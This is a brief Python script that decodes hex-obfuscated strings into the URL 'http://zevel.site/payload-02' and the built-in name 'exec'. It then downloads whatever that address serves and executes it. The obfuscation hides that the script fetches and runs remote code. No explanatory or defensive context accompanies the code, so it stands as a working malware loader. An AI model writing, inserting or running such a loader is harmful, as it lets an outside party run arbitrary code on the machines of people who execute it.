import builtins
import requests

url = bytes.fromhex('687474703a2f2f7a6576656c2e736974652f7061796c6f61642d3032').decode()
payload = requests.get(url).text
getattr(builtins, bytes.fromhex('65786563').decode())(payload)
